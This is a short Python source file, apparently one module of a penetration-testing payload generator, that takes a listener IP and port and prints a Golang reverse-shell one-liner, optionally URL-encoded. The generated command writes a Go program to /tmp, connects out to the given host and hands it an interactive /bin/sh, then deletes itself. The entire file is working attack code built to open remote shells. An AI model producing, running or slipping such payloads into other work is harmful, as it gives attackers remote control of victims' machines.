import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return Golang reverse shell one-liner"""
    cmd = (f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\","
           f"\"{listener_ip}:{listener_port}\");cmd:=exec.Command(\"/bin/sh\");"
           f"cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Golang reverse shell:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
